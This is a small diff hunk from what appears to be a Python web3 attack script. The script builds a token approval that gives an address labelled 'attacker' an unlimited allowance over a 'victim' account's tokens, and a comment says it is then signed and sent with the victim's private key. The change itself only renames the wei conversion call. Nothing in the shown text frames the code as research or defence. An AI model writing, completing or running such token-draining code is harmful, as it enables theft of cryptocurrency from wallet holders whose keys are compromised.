@@ -22,7 +22,7 @@ tx1 = token.functions.approve(attacker, 2**256 - 1).build_transaction({
     "from": victim,
     "nonce": w3.eth.get_transaction_count(victim),
     "gas": 200000,
-    "gasPrice": w3.to_wei("5", "gwei")
+    "gasPrice": w3.toWei("5", "gwei")
 })
 
 # Sign and send with victim's private key
